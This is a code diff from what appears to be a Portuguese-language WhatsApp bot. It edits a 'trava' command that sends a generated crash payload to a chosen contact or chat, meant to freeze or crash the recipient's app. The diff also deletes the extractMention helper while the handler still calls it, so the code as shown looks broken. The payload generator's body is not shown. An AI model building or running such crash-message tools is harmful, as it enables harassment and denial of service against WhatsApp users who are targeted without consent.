@@ -13,26 +13,16 @@ function generateCrashPayload() {
   return payload;
 }
 
-function extractMention(msg) {
-  if (msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.length) {
-    return msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
-  }
-  if (msg.message?.extendedTextMessage?.contextInfo?.participant) {
-    return msg.message.extendedTextMessage.contextInfo.participant;
-  }
-  return null;
-}
-
 async function handleTrava(sock, { msg, jid, sender, args }) {
   if (!await isOwner(sender, sock)) {
-    await sock.sendMessage(jid, { text: 'âŒ Apenas o dono do bot pode usar este comando.' });
+    await sock.sendMessage(jid, { text: '❌ Apenas o dono do bot pode usar este comando.' });
     return;
   }
 
   const target = extractMention(msg) || args[0];
   const targetJid = target ? (target.includes('@') ? target : target + '@s.whatsapp.net') : jid;
 
-  await sock.sendMessage(jid, { text: `âš ï¸ Enviando trava para ${targetJid === jid ? 'este chat' : targetJid.split('@')[0]}...` });
+  await sock.sendMessage(jid, { text: `⚠️ Enviando trava para ${targetJid === jid ? 'este chat' : targetJid.split('@')[0]}...` });
 
   const payload = generateCrashPayload();
   await sock.sendMessage(targetJid, { text: payload });
